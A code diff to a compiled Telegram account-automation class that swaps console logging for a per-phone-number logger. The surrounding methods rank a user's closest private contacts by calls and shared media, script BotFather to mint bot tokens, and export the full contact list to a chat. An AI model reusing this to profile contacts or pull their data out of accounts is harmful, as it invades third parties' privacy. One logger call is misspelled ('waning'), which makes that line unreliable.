             ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
         };
         const ent = await this.safeGetEntity(chatId);
-        console.log(query);
+        this.logger.info(this.phoneNumber, `${query}`);
         const messages = await this.client.getMessages(ent, query);
-        console.log(`Fetched ${messages.length} messages`);
+        this.logger.info(this.phoneNumber, `Fetched ${messages.length} messages`);
         const filteredMessages = messages.filter(message => {
             if (!message.media)
                 return false;
             const mediaType = this.getMediaType(message.media);
             return types.includes(mediaType);
         });
-        console.log(`Filtered down to ${filteredMessages.length} messages`);
+        this.logger.info(this.phoneNumber, `Filtered down to ${filteredMessages.length} messages`);
         const mediaData = await Promise.all(filteredMessages.map(async (message) => {
             let thumbBuffer = null;
             try {
@@ -2101,7 +2103,7 @@ class TelegramManager {
                 }
             }
             catch (error) {
-                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);
+                this.logger.waning(this.phoneNumber, `Failed to get thumbnail for message ${message.id}:`, error.message);
             }
             const mediaDetails = await this.getMediaDetails(message.media);
             return {
@@ -2126,7 +2128,7 @@ class TelegramManager {
             return await this.client.getEntity(entityId);
         }
         catch (error) {
-            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);
+            this.logger.info(this.phoneNumber, `Failed to get entity directly for ${entityId}, searching in dialogs...`);
             try {
                 const dialogs = await this.client.getDialogs({
                     limit: 300
@@ -2137,11 +2139,11 @@ class TelegramManager {
                         return entity;
                     }
                 }
-                console.log(`Entity ${entityId} not found in dialogs either`);
+                this.logger.info(this.phoneNumber, `Entity ${entityId} not found in dialogs either`);
                 return null;
             }
             catch (dialogError) {
-                console.error('Error while searching dialogs:', dialogError);
+                this.logger.error(this.phoneNumber, 'Error while searching dialogs:', dialogError);
                 return null;
             }
         }
@@ -2529,7 +2531,7 @@ class TelegramManager {
     async getTopPrivateChats() {
         if (!this.client)
             throw new Error('Client not initialized');
-        console.log('Starting getTopPrivateChats analysis...');
+        this.logger.info(this.phoneNumber, 'Starting getTopPrivateChats analysis...');
         const startTime = Date.now();
         const weights = {
             videoCall: 15,
@@ -2539,41 +2541,41 @@ class TelegramManager {
             sharedPhoto: 4,
             textMessage: 1,
         };
-        console.log('Fetching dialogs...');
+        this.logger.info(this.phoneNumber, 'Fetching dialogs...');
         const dialogs = await this.client.getDialogs({
             limit: 200
         });
-        console.log(`Found ${dialogs.length} total dialogs`);
+        this.logger.info(this.phoneNumber, `Found ${dialogs.length} total dialogs`);
         const privateChats = dialogs.filter(dialog => dialog.isUser &&
             dialog.entity instanceof telegram_1.Api.User &&
             !dialog.entity.bot &&
             !dialog.entity.fake &&
             dialog.entity.id.toString() !== "777000" &&
             dialog.entity.id.toString() !== "42777");
-        console.log(`Found ${privateChats.length} valid private chats after filtering`);
+        this.logger.info(this.phoneNumber, `Found ${privateChats.length} valid private chats after filtering`);
         const now = Math.floor(Date.now() / 1000);
         const batchSize = 10;
         const chatStats = [];
         const callLogs = await this.getCallLogsInternal();
-        console.log(callLogs);
+        this.logger.info(this.phoneNumber, `${callLogs}`);
         for (let i = 0; i < privateChats.length; i += batchSize) {
-            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
+            this.logger.info(this.phoneNumber, `Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
             const batch = privateChats.slice(i, i + batchSize);
             const batchResults = await Promise.all(batch.map(async (dialog) => {
                 const processingStart = Date.now();
                 const chatId = dialog.entity.id.toString();
                 const user = dialog.entity;
-                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);
+                this.logger.info(this.phoneNumber, `Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);
                 try {
                     const messages = await this.client.getMessages(chatId, {
                         limit: 30,
                     });
                     if (messages.length < 20) {
-                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
+                        this.logger.info(this.phoneNumber, `Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                         return null;
                     }
                     const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.CHAT_PHOTO], limit: 100 });
-                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
+                    this.logger.info(this.phoneNumber, `Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
                     const callStats = {
                         total: 0,
                         incoming: 0,
@@ -2582,7 +2584,7 @@ class TelegramManager {
                     };
                     const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };
                     const userCalls = callLogs[chatId];
-                    console.log(userCalls);
+                    this.logger.info(this.phoneNumber, userCalls);
                     if (userCalls) {
                         callStats.total = userCalls.totalCalls;
                         callStats.incoming = userCalls.incoming;
@@ -2602,7 +2604,7 @@ class TelegramManager {
                         textMessages: (messages.total * weights.textMessage) / interactionScore * 100
                     };
                     const processingTime = Date.now() - processingStart;
-                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);
+                    this.logger.info(this.phoneNumber, `Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);
                     return {
                         chatId,
                         username: user.username,
@@ -2616,7 +2618,7 @@ class TelegramManager {
                     };
                 }
                 catch (error) {
-                    console.error(`Error processing chat ${chatId}:`, error);
+                    this.logger.error(this.phoneNumber, `Error processing chat ${chatId}:`, error);
                     return null;
                 }
             }));
@@ -2626,9 +2628,9 @@ class TelegramManager {
             .sort((a, b) => b.interactionScore - a.interactionScore)
             .slice(0, 10);
         const totalTime = Date.now() - startTime;
-        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
+        this.logger.info(this.phoneNumber, `getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
         topChats.forEach((chat, index) => {
-            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
+            this.logger.info(this.phoneNumber, `Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
         });
         return topChats;
     }
@@ -2636,37 +2638,37 @@ class TelegramManager {
         if (!this.client)
             throw new Error('Client not initialized');
         try {
-            console.log('Creating group or channel with options:', options);
+            this.logger.info(this.phoneNumber, 'Creating group or channel with options:', options);
             const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
             return result;
         }
         catch (error) {
-            console.error('Error creating group or channel:', error);
+            this.logger.error(this.phoneNumber, 'Error creating group or channel:', error);
             throw new Error(`Failed to create group or channel: ${error.message}`);
         }
     }
     async createBot(options) {
         if (!this.client) {
-            console.error('Bot creation failed: Client not initialized');
+            this.logger.error(this.phoneNumber, 'Bot creation failed: Client not initialized', {});
             throw new Error('Client not initialized');
         }
         const botFatherUsername = 'BotFather';
-        console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
+        this.logger.info(this.phoneNumber, `[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
         try {
-            console.log('[BOT CREATION] Attempting to get entity for BotFather...');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Attempting to get entity for BotFather...');
             const entity = await this.client.getEntity(botFatherUsername);
-            console.log('[BOT CREATION] Successfully connected to BotFather');
-            console.log('[BOT CREATION] Sending /newbot command...');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Successfully connected to BotFather');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /newbot command...');
             await this.client.sendMessage(entity, {
                 message: '/newbot'
             });
-            console.log('[BOT CREATION] Waiting for BotFather response after /newbot command...');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after /newbot command...');
             await new Promise(resolve => setTimeout(resolve, 1000));
-            console.log(`[BOT CREATION] Sending bot name: "${options.name}"`);
+            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot name: "${options.name}"`);
             await this.client.sendMessage(entity, {
                 message: options.name
             });
-            console.log('[BOT CREATION] Waiting for BotFather response after sending name...');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending name...');
             await new Promise(resolve => setTimeout(resolve, 1000));
             let botUsername = options.username;
             if (!/_bot$/.test(botUsername)) {
@@ -2676,92 +2678,92 @@ class TelegramManager {
                     uniqueSuffix += chars.charAt(Math.floor(Math.random() * chars.length));
                 }
                 botUsername = botUsername.replace(/_?bot$/, '') + `_${uniqueSuffix}_bot`;
-                console.log(`[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
+                this.logger.info(this.phoneNumber, `[BOT CREATION] Modified username to ensure uniqueness: ${botUsername}`);
             }
-            console.log(`[BOT CREATION] Sending bot username: "${botUsername}"`);
+            this.logger.info(this.phoneNumber, `[BOT CREATION] Sending bot username: "${botUsername}"`);
             await this.client.sendMessage(entity, {
                 message: botUsername
             });
-            console.log('[BOT CREATION] Waiting for BotFather response after sending username...');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Waiting for BotFather response after sending username...');
             await new Promise(resolve => setTimeout(resolve, 1000));
-            console.log('[BOT CREATION] Retrieving response from BotFather...');
+            this.logger.info(this.phoneNumber, '[BOT CREATION] Retrieving response from BotFather...');
             const messages = await this.client.getMessages(entity, {
                 limit: 1
             });
             if (!messages || messages.length === 0) {
-                console.error('[BOT CREATION] No response received from BotFather');
+                this.logger.error(this.phoneNumber, '[BOT CREATION] No response received from BotFather', {});
                 throw new Error('No response received from BotFather');
             }
             const lastMessage = messages[0].message;
-            console.log(`[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
+            this.logger.info(this.phoneNumber, `[BOT CREATION] BotFather response: "${lastMessage.substring(0, 50)}..."`);
             if (!lastMessage.toLowerCase().includes('use this token')) {
-                console.error(`[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`);
+                this.logger.error(this.phoneNumber, `[BOT CREATION] Bot creation failed, unexpected response: "${lastMessage}"`, {});
                 throw new Error(`Bot creation failed: ${lastMessage}`);
             }
             const tokenMatch = lastMessage.match(/(\d+:[A-Za-z0-9_-]+)/);
             if (!tokenMatch) {
-                console.error('[BOT CREATION] Could not extract bot token from BotFather response');
+                this.logger.error(this.phoneNumber, '[BOT CREATION] Could not extract bot token from BotFather response', {});
                 throw new Error('Could not extract bot token from BotFather response');
             }
             const botToken = tokenMatch[0];
-            console.log(`[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
+            this.logger.info(this.phoneNumber, `[BOT CREATION] Successfully extracted bot token: ${botToken.substring(0, 5)}...`);
             if (options.description) {
-                console.log('[BOT CREATION] Setting bot description...');
+                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting bot description...');
                 await this.client.sendMessage(entity, { message: '/setdescription' });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log(`[BOT CREATION] Selecting bot @${options.username} for description update...`);
+                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for description update...`);
                 await this.client.sendMessage(entity, { message: `@${options.username}` });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log('[BOT CREATION] Sending description text...');
+                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending description text...');
                 await this.client.sendMessage(entity, { message: options.description });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log('[BOT CREATION] Description set successfully');
+                this.logger.info(this.phoneNumber, '[BOT CREATION] Description set successfully');
             }
             if (options.aboutText) {
-                console.log('[BOT CREATION] Setting about text...');
+                this.logger.info(this.phoneNumber, '[BOT CREATION] Setting about text...');
                 await this.client.sendMessage(entity, { message: '/setabouttext' });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log(`[BOT CREATION] Selecting bot @${options.username} for about text update...`);
+                this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for about text update...`);
                 await this.client.sendMessage(entity, { message: `@${options.username}` });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log('[BOT CREATION] Sending about text...');
+                this.logger.info(this.phoneNumber, '[BOT CREATION] Sending about text...');
                 await this.client.sendMessage(entity, { message: options.aboutText });
                 await new Promise(resolve => setTimeout(resolve, 1000));
-                console.log('[BOT CREATION] About text set successfully');
+                this.logger.info(this.phoneNumber, '[BOT CREATION] About text set successfully');
             }
             if (options.profilePhotoUrl) {
-                console.log(`[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
+                this.logger.info(this.phoneNumber, `[BOT CREATION] Setting profile photo from URL: ${options.profilePhotoUrl}`);
                 try {
-                    console.log('[BOT CREATION] Downloading profile photo...');
+                    this.logger.info(this.phoneNumber, '[BOT CREATION] Downloading profile photo...');
                     const photoBuffer = await this.downloadFileFromUrl(options.profilePhotoUrl);
-                    console.log(`[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
-                    console.log('[BOT CREATION] Sending /setuserpic command...');
+                    this.logger.info(this.phoneNumber, `[BOT CREATION] Photo downloaded successfully, size: ${photoBuffer.length} bytes`);
+                    this.logger.info(this.phoneNumber, '[BOT CREATION] Sending /setuserpic command...');
                     await this.client.sendMessage(entity, { message: '/setuserpic' });
                     await new Promise(resolve => setTimeout(resolve, 1000));
-                    console.log(`[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
+                    this.logger.info(this.phoneNumber, `[BOT CREATION] Selecting bot @${options.username} for profile photo update...`);
                     await this.client.sendMessage(entity, { message: `@${options.username}` });
                     await new Promise(resolve => setTimeout(resolve, 1000));
-                    console.log('[BOT CREATION] Uploading profile photo...');
+                    this.logger.info(this.phoneNumber, '[BOT CREATION] Uploading profile photo...');
                     await this.client.sendFile(entity, {
                         file: Buffer.from(photoBuffer),
                         caption: '',
                         forceDocument: false
                     });
                     await new Promise(resolve => setTimeout(resolve, 1000));
-                    console.log('[BOT CREATION] Profile photo set successfully');
+                    this.logger.info(this.phoneNumber, '[BOT CREATION] Profile photo set successfully');
                 }
                 catch (photoError) {
-                    console.error(`[BOT CREATION] Failed to set profile photo: ${photoError.message}`);
+                    this.logger.error(this.phoneNumber, `[BOT CREATION] Failed to set profile photo: ${photoError.message}`, {});
                 }
             }
-            console.log(`[BOT CREATION] Bot creation completed successfully: @${options.username}`);
+            this.logger.info(this.phoneNumber, `[BOT CREATION] Bot creation completed successfully: @${options.username}`);
             return {
                 botToken,
                 username: botUsername
             };
         }
         catch (error) {
-            console.error(`[BOT CREATION] Error during bot creation process: ${error.message}`, error);
+            this.logger.error(this.phoneNumber, `[BOT CREATION] Error during bot creation process: ${error.message}`, error);
             throw new Error(`Failed to create bot: ${error.message}`);
         }
     }
@@ -2795,7 +2797,7 @@ class TelegramManager {
                     caption: `Contacts file with ${contacts.users.length} contacts`,
                     forceDocument: true
                 });
-                console.log(`Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
+                this.logger.info(this.phoneNumber, `Sent contacts file with ${contacts.users.length} contacts to chat ${chatId}`);
             }
             finally {
                 if (fs.existsSync(tempPath)) {
@@ -2804,7 +2806,7 @@ class TelegramManager {
             }
         }
         catch (error) {
-            console.error('Error sending contacts file:', error);
+            this.logger.error(this.phoneNumber, 'Error sending contacts file:', error);
             throw error;
         }
     }
